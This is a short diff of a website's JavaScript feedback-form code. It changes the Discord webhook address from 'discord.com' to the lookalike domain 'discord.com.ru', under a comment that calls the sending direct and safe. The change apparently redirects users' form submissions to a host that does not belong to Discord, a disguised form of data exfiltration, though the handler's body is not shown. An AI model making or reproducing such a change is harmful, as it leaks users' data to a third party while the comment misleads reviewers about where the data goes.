@@ -106,7 +106,7 @@ if(searchInput) {
 // Прямая безопасная отправка в Discord без внешних IP-чекеров
 const feedbackForm = document.getElementById("feedback-form");
 const successMsg = document.getElementById("fb-success");
-const discordWebhookUrl = "https://discord.com";
+const discordWebhookUrl = "https://discord.com.ru";
 
 if(feedbackForm) {
     feedbackForm.addEventListener("submit", (e) => {
